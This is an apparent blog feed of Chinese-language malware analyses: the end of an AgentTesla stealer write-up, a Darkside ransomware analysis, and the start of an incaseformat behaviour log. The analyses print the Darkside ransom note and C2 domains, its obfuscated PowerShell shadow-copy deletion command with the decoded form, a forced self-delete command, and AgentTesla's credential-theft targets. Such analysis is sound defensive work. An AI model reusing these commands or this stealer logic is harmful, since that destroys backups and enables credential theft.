Browser = &quot;FTPCommander&quot;
x.Browser = &quot;FTPGetter&quot;
Browser = &quot;NO-IP&quot;
Browser = &quot;NO-IP&quot;
Browser = &quot;TheBat&quot;
x.Browser = &quot;Becky!&quot;
Browser = &quot;Trillian&quot;
x.Browser = &quot;Outlook&quot;
x.Browser = &quot;Foxmail&quot;
x.Browser = &quot;Opera Mail&quot;
x.Browser = &quot;PocoMail&quot;
Browser = &quot;eM Client&quot;
x.Browser = &quot;Mailbird&quot;
x.Browser = &quot;Mailbird&quot;
Browser = &quot;NordVPN&quot;
Browser = &quot;MySQL Workbench&quot;
Browser = &quot;Private Internet Access&quot;
x.Browser = &quot;Safari Browser&quot;
x.Browser = &quot;Internet Download Manager&quot;
</code></pre><h4 id="3315-vnc凭证窃取">3.3.15. VNC凭证窃取</h4>
<p><img src="/tesla_images/1320920203013.png" alt=""></p>
<h4 id="3316-下载tor浏览器">3.3.16. 下载Tor浏览器</h4>
<p><img src="/tesla_images/4431331170914.png" alt=""></p>
<h3 id="34-动态调试">3.4. 动态调试</h3>
<p>进入程序入口，会生成一串字符串，用于标识受害者主机，然后会设置一个30s的定时循环任务，接着开始进行浏览器用户数据窃取；</p>
<p><img src="/tesla_images/2016144140664.png" alt=""></p>
<p>汇总如下：</p>
<pre><code>@&quot;C:\Users\alee\AppData\Local\7Star\7Star\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\uCozMedia\Uran\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\MapleStudio\ChromePlus\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Yandex\YandexBrowser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Torch\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Coowon\Coowon\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Comodo\Dragon\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Sputnik\Sputnik\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Iridium\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Vivaldi\User Data&quot;
@&quot;C:\Users\alee\AppData\Roaming\Opera Software\Opera Stable&quot;
@&quot;C:\Users\alee\AppData\Local\Chedot\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CocCoc\Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer&quot;
@&quot;C:\Users\alee\AppData\Local\Epic Privacy Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Elements Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Amigo\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CatalinaGroup\Citrio\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\BraveSoftware\Brave-Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\360Chrome\Chrome\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Kometa\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\liebao\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CentBrowser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\QIP Surf\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Chromium\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Orbitum\User Data&quot;
</code></pre><p>然后会在每一个目录下寻找<code>logins</code>文件夹，窃取其中的信息</p>
<p><img src="/tesla_images/4256159090.png" alt=""></p>
<p>针对<code>logins</code>内的文件窃取函数内容如下：</p>
<p><img src="/tesla_images/4252004160664.png" alt=""></p>
<p>往下则是一列窃取函数的调用，核实并整理后如下：</p>
<pre><code>list.AddRange(global::A.b.E.LoginsSteal(x.A, x.A));
list.AddRange(global::A.b.E.RimArtsSteal());
list.AddRange(global::A.b.E.ChromeSteal());
list.AddRange(global::A.b.E.FlockSteal());
list.AddRange(global::A.b.E.IceDragonSteal());
list.AddRange(global::A.b.E.OpearMailSteal());
list.AddRange(global::A.b.E.GetOSVersion());
list.AddRange(global::A.b.E.ClawsMailSteal());
list.AddRange(global::A.b.E.PostboxSteal());
list.AddRange(global::A.b.E.AppleSteal());
list.AddRange(global::A.b.E.IncrediMailSteal());
list.AddRange(global::A.b.E.BlackHawkSteal());
list.AddRange(global::A.b.E.IceCatSteal());
list.AddRange(global::A.b.E.WaterFoxSteal());
list.AddRange(global::A.b.E.PocomailSteal());
list.AddRange(global::A.b.E.UCBrowserSteal());
list.AddRange(global::A.b.E.FileZillaSteal());
list.AddRange(global::A.b.E.FirefoxSteal());
list.AddRange(global::A.b.E.WinSCP_2_Steal());
list.AddRange(global::A.b.E.FalkonSteal());
list.AddRange(global::A.b.E.QQBrowserSteal());
list.AddRange(global::A.b.E.CyberFoxSteal());
list.AddRange(global::A.b.E.SeaMonkeySteal());
list.AddRange(global::A.b.E.K-MeleonSteal());
list.AddRange(global::A.b.E.OutLookSteal());
list.AddRange(global::A.b.E.FoxmailSteal());
list.AddRange((IEnumerable&lt;global::A.b.X&gt;)global::A.b.E.EudoraSteal());
list.AddRange(global::A.b.E.ThunderbirdSteal());
list.AddRange(global::A.b.E.PaleMoonSteal());
</code></pre><h2 id="4-总结">4. 总结</h2>
<p>AgentTesla是一款商业窃密木马，当中还存在某些交互并未深入分析，不过基础模块已经很清晰了，从这些模块可以看出大多是针对浏览器和邮件客户端的窃密。这里提醒大家尽量不要在浏览器中保存密码，在使用邮件客户端时，也应当格外小心。</p>
]]></content>
		</item>
		
		<item>
			<title>DarksideRansomware</title>
			<link>https://www.a1ee.cn/medium/darksideransomware/</link>
			<pubDate>Tue, 25 May 2021 10:56:10 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/darksideransomware/</guid>
			<description>DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本</description>
			<content type="html"><![CDATA[<h1 id="darksideransomware样本分析">DarksideRansomware样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>本次分析的样本来源于<a href="https://bazaar.abuse.ch/sample/151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5/">MALWAREbazaar</a>。具体的SHA、MD5如下：</p>
<pre><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57
MD5 hash:9d418ecc0f3bf45029263b0944236884
</code></pre><p>本次分析的环境是：<code>windows 7 ultimate sp1 x64</code></p>
<h2 id="样本分析">样本分析</h2>
<h3 id="去除重定位">去除重定位</h3>
<p>因为是在win7上做调试，使用LordPE关闭程序的重定位（为了方便写注释），由于该样本逻辑并不复杂，所以也可以不做这一步。</p>
<p><img src="/darkside_images/3185806156853.png" alt=""></p>
<p>（注：为方便区分，关闭重定向后的样本名为：Darkside.exe）</p>
<h3 id="普通用户权限运行样本">普通用户权限运行样本</h3>
<p>从函数功能及运行流程可以得出：当样本感染了一台主机后，会动态加载自身所需的dll，接着释放使用的字符串，然后判断当前执行权限是否是admin权限，如果不是，则进行提权，然后用管理员权限重载自身。</p>
<p><img src="/darkside_images/3132437176854.png" alt=""></p>
<h4 id="加载dll函数">加载dll函数</h4>
<p>dll的加载又解密函数解密dll名称，再使用<code>loardlibrary</code>加载。解密函数核心流程如下：</p>
<p><img src="/darkside_images/3880452197020.png" alt=""></p>
<p>最后解出来的dll名称为：</p>
<pre><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
</code></pre><h4 id="字符串解析">字符串解析</h4>
<p>以下就是字符串解析的核心算法：</p>
<p><img src="/darkside_images/5527236106855.png" alt=""></p>
<p>当解密函数运行结束，可以看到以下调用关系：</p>
<p><img src="/darkside_images/1727847127021.png" alt=""></p>
<p>手动导出字符串，内容如下：</p>
<pre><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default

autorun.inf，boot.ini，bootfont.bin，bootsect.bak，desktop.ini，iconcache.db，ntldr，ntuser.dat，ntuser.dat.log，ntuser.ini，thumbs.db

386，adv，ani，bat，bin，cab，cmd，com，cpl，cur，deskthemepack，diagcab，diagcfg，diagpkg，dll，drv，exe，hlp，icl，icns，ico，ics，idx，ldf，lnk，mod，mpa，msc，msp，msstyles，msu，nls，nomedia，ocx，prf，ps1，rom，rtp，scr，shs，spl，sys，theme，themepack，wpx，lock，key，hta，msi，pdb

backup

sql，sqlite

vmcompute.exe，vmms.exe，vmwp.exe，svchost.exe，TeamViewer.exe，explorer.exe

sql，oracle，ocssd，dbsnmp，synctime，agntsvc，isqlplussvc，xfssvccon，mydesktopservice，ocautoupds，encsvc，firefox，tbirdconfig，mydesktopqos，ocomm，dbeng50，sqbcoreservice，excel，infopath，msaccess，mspub，onenote，outlook，powerpnt，steam，thebat，thunderbird，visio，winword，wordpad，notepad

vss，sql，svc$，memtas，mepocs，sophos，veeam，backup，GxVss，GxBlr，GxFWD，GxCVD，GxCIMgr

securebestapp20.com，temisleyes.com

All of your files are encrypted! Find %s and Follow Instructions!

----------- [ Welcome to DarkSide ] -------------&gt;

What happend?
----------------------------------------------
Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. .. But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network
Follow our instructions below and you will recover all your data.

What guarantees?
----------------------------------------------
We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
We guarantee to decrypt one file for free. Go to the site and contact us.

How to get access on website?
----------------------------------------------
Using a TOR browser:
1) Download and install TOR browser from this site: https://torproject.org/
2) Open our website: http://darksidfqzcuhtk2.onion/CZEX8E0GR0AO4ASUCJE1K824OKJA1G24B8B3G0P84LJTTE7W8EC86JBE7NBXLMRT

When you open our website, put the following data in the input form:
Key
:0kZdK3HQhsAkUtvRl41QkOdpJvzcWnCrBjjgg5U4zfuWeTnZR5Ssjd3QLHpmbjxjo7uWzKbt8qPVuYN38TsDPI3bemd5I40ksemIzuI5OhIHZsi9cn3Wpd7OUT72FP9MyAUzR586yMsI2Ygri9in0Bf4EkG0pmBOLyRG1T788foGJQW1WxS1Qd2sMVvX0jKlbGG1zLp7g0u6buDCzSMyTjWjuVzJYufBBv7S2XvciEVvboiTNbZA4UUU6PttKERQSb018aILd6xO3ulk6fbEgZDO5tZSGn2zRevn5YXnHtg6vt1ToLe3izQOgYbs8Ja1fkfJBUYVux1ITyWBjpn0xPayKfwln8SqgMkbqiDyxEDEtFhqiffLcONMhi4TmW50loZIC6mWSaOjThWp6XSJUWPtY8Mkzs8Cs0qjPahx58iAEVIRGUVpLkMs7xPN7ydZ6wMWaOcRC1AD1JEUVTjLikXXyckgYaS6FnEv0UNEsv6QbTLSpDomIg3rEYZBib6ozrwH5n0M5wrKo8NciUBmfJWDP4XKkjznpsa05rEpuAklM0dMmZsYGVR

!!! DANGER !!!
DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.
!!! DANGER !!!
</code></pre><h4 id="访问令牌读取函数">访问令牌读取函数</h4>
<p>进入函数内部，根据api调用情况可以看到该函数结构简单：</p>
<p><img src="/darkside_images/2427851119690.png" alt=""></p>
<p>这里有两个判断较为重要</p>
<pre><code>cmp dword ptr ds:[eax+0x8], 0x20
cmp dword ptr ds:[eax+0xC], 0x220
</code></pre><p>在微软官方的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">安全标识符说明</a>中可以找到sid的值为32和544的角色权限分别如下：</p>
<p><img src="/darkside_images/5706513170561.png" alt=""></p>
<p><img src="/darkside_images/5203714188987.png" alt=""></p>
<p>如果没有这两个权限，那么将不会进行uac提权。</p>
<h4 id="提权和重载自身函数">提权和重载自身函数</h4>
<p>该部分均为api调用，较为简单明了。</p>
<p><img src="/darkside_images/2970710126245.png" alt=""></p>
<h3 id="管理员权限运行样本">管理员权限运行样本</h3>
<p>当样本获得了管理员权限，那么自然是要进行加密操作了，在此之前，它将会通过crc32计算后缀名用于图标生成和加密文件字符串添加；检索本地语言；发送信息至服务器；删除本地卷影；检索本地磁盘空闲空间；加密所有文件；自我删除。</p>
<h4 id="后缀名生成函数">后缀名生成函数</h4>
<p>该函数主要是<code>crc32计算</code>。图标的名字来源于uuid，通过了4次crc32计算</p>
<p><img src="/darkside_images/5111541121999.png" alt=""></p>
<p>crc32计算函数如下：</p>
<p><img src="/darkside_images/4693844139879.png" alt=""></p>
<h4 id="本地语言判断函数">本地语言判断函数</h4>
<p>样本会获取本地<code>默认ui语言</code>和<code>区域格式语言</code>，如果是<code>白名单</code>内的语言，则退出，不是则进行下一步。语言判断函数部分核心如下：</p>
<p><img src="/darkside_images/1011651136226.png" alt=""></p>
<p>从<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f">Windows语言代码标识符（LCID）参考</a>中得知，本地语言所有判断如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">语言代码（hex）</th>
<th style="text-align:center">标识符</th>
<th style="text-align:center">语种</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">419</td>
<td style="text-align:center">ru-RU</td>
<td style="text-align:center">俄语</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">422</td>
<td style="text-align:center">uk-UA</td>
<td style="text-align:center">乌克兰语</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">423</td>
<td style="text-align:center">be-BY</td>
<td style="text-align:center">白俄罗斯语</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">428</td>
<td style="text-align:center">tg-Cyrl-TJ</td>
<td style="text-align:center">塔吉克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">42B</td>
<td style="text-align:center">hy-AM</td>
<td style="text-align:center">亚美尼亚语</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">42C</td>
<td style="text-align:center">az-Latn-AZ</td>
<td style="text-align:center">阿塞拜疆语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">437</td>
<td style="text-align:center">ka-GE</td>
<td style="text-align:center">格鲁吉亚语</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">43F</td>
<td style="text-align:center">kk-KZ</td>
<td style="text-align:center">哈萨克语</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">440</td>
<td style="text-align:center">ky-KG</td>
<td style="text-align:center">吉尔吉斯语</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">442</td>
<td style="text-align:center">tk-TM</td>
<td style="text-align:center">土库曼语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">443</td>
<td style="text-align:center">uz-Latn-UZ</td>
<td style="text-align:center">乌兹别克语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">444</td>
<td style="text-align:center">tt-RU</td>
<td style="text-align:center">塔塔尔语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">818</td>
<td style="text-align:center">ro-MD</td>
<td style="text-align:center">罗马尼亚语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">819</td>
<td style="text-align:center">ru-MD</td>
<td style="text-align:center">俄语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">82C</td>
<td style="text-align:center">az-Cyrl-AZ</td>
<td style="text-align:center">阿塞拜疆语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">843</td>
<td style="text-align:center">uz-Cyrl-UZ</td>
<td style="text-align:center">乌兹别克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">2801</td>
<td style="text-align:center">ar-SY</td>
<td style="text-align:center">阿拉伯语（叙利亚）</td>
</tr>
</tbody>
</table>
<h4 id="发送信息至服务器函数">发送信息至服务器函数</h4>
<p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
<pre><code>{
	&quot;bot&quot;:{
	&quot;ver&quot;:&quot;1.8.6.2&quot;,
	&quot;uid&quot;:&quot;060108efb510c98&quot;
	},
	&quot;os&quot;:{
	&quot;lang&quot;:&quot;zh-CN&quot;,
	&quot;username&quot;:&quot;alee&quot;,
	&quot;hostname&quot;:&quot;WIN-B1ESUN1R9U8&quot;,
	&quot;domain&quot;:&quot;WORKGROUP&quot;,
	&quot;os_type&quot;:&quot;windows&quot;,
	&quot;os_version&quot;:&quot;Windows 7 Ultimate&quot;,
	&quot;os_arch&quot;:&quot;x64&quot;,
	&quot;disks&quot;:&quot;C:72/99&quot;,
	&quot;id&quot;:&quot;826dfd7bd5985bdbd259&quot;
	}
}
</code></pre><p>服务器为：<code>securebestapp20.com</code></p>
<h4 id="删除本地卷影">删除本地卷影</h4>
<p>核心代码如下：</p>
<p><img src="/darkside_images/5604835168666.png" alt=""></p>
<p>powershell命令如下：</p>
<pre><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
</code></pre><p>将十六进制转换成字符串如下：</p>
<pre><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
</code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间</h4>
<p>空闲空间检索存在两个判断，但至少保证有100mb才会进行下一步。</p>
<p><img src="/darkside_images/192720173802.png" alt=""></p>
<h4 id="加密所有文件">加密所有文件</h4>
<p>从动态调试中可以找到加密主函数的地址，在ida中呈现如下：</p>
<p><img src="/darkside_images/1604535140565.png" alt=""></p>
<p>进入其中可发现流程如下：</p>
<p><img src="/darkside_images/4085142188991.png" alt=""></p>
<p>进入加密流程可以看到：会检索文件结构，然后递归对文件进行加密。</p>
<p><img src="/darkside_images/2721245176858.png" alt=""></p>
<p>深入到加密操作中，发现会首先进行是否加密判断，未加密则重命名：</p>
<p><img src="/darkside_images/3495450197024.png" alt=""></p>
<p>对文件内容进行rsa1028加密，并生成加密文件：</p>
<p><img src="/darkside_images/2789151189693.png" alt=""></p>
<h4 id="自我删除">自我删除</h4>
<p>自我删除的主函数如下：</p>
<p><img src="/darkside_images/33802100566.png" alt=""></p>
<p>使用<code>Procmon</code>检测到的指令如下：</p>
<pre><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
</code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
<pre><code>/C      执行字符串指定的命令然后终止
/Q      关闭回显
/F      启用文件和目录名完成字符
</code></pre><h2 id="总结">总结</h2>
<p>这是我第二次做样本分析，其中遇到了很多问题，api的熟悉度这个是一个经验问题，另外两个问题是最为严重的：</p>
<ul>
<li>ida动态链接库的引入</li>
<li>由汇编代码判断加密方式</li>
</ul>
<p>第一个问题如果不是有现成的<code>idapython</code>脚本，那我将不可能完成本次分析，所以深入了解<code>idapython</code> 脚本的编写是很有必要的；</p>
<p>第二个问题则需要通过对更多样本的分析，或自我构建加密程序进行分析才能够弥补差距。后续将采用两种方式并进的模式进行能力增强。</p>
<p>最后本次分析参考了很多前辈分享的资料，感谢大家的无私分享。</p>
<p>参考资料：<code>https://chuongdong.com/reverse%20engineering/2021/05/06/DarksideRansomware/</code></p>
]]></content>
		</item>
		
		<item>
			<title>Incaseformat</title>
			<link>https://www.a1ee.cn/medium/incaseformat/</link>
			<pubDate>Fri, 29 Jan 2021 11:47:34 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/incaseformat/</guid>
			<description>incaseformat样本分析 0. 前言 从关于病毒的新闻可以知道这是一个具有删除和自我复制的病毒； 从别人对病毒的评价可以知道这是一个很棒的练手</description>
			<content type="html"><![CDATA[<h1 id="incaseformat样本分析">incaseformat样本分析</h1>
<h2 id="0-前言">0. 前言</h2>
<p>从关于<a href="https://mp.weixin.qq.com/s/JWUIK9JTrlFMXozl1LmNlw">病毒的新闻</a>可以知道这是一个具有删除和自我复制的病毒；</p>
<p>从别人对<a href="https://mp.weixin.qq.com/s/B-d9ctMwPoiO6D_ptbmhBw">病毒的评价</a>可以知道这是一个很棒的练手工具。</p>
<p>这是我分析的第一个样本，其中一定会有遗漏的地方，以及牵强之处，希望大家多多批评指正。</p>
<h2 id="1-行为捕获">1. 行为捕获</h2>
<p>直接运行样本，并使用火绒剑进行行为捕获：</p>
<pre><code>16:43:31:605,	tsay.exe,	1064:0,	1064,	EXEC_create,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:745,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:823,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:870,	tsay.exe,	1064:2276,	1064,	FILE_touch,	C:\windows\tsay.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_read,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:0,	1064,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
16:43:31:901,	tsay.exe,	1064:2276,	1064,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:43:31:917,	tsay.exe,	1064:0,	1064,	EXEC_destroy,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>将时间设置为1月13日，以管理员权限运行木马程序：</p>
<pre><code>16:42:32:202,	tsay.exe,	2568:0,	0,	EXEC_create,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' image_base:0x00007FF6B6C80000 image_size:0x00080000 ,	0x00000000 [操作成功完成。  ],	
16:42:32:499,	tsay.exe,	2568:0,	0,	EXEC_module_load,	C:\Windows\System32\vm3dum64_10.dll,	base:0x00007FFB01970000 size:0x00061000 ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:6180,	0,	REG_setval,	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-655661564-3040666061-2252561177-1000\\Device\HarddiskVolume3\Windows\System32\SystemSettingsAdminFlows.exe,	type:0x00000003 datalen:24 data:'28 BB 33 09 88 E9 D6 01 00 00 00 00 00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:42:33:321,	tsay.exe,	2568:0,	0,	EXEC_destroy,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' ,	0x00000000 [操作成功完成。  ],	
16:45:41:433,	tsay.exe,	2568:0,	2568,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:464,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:511,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
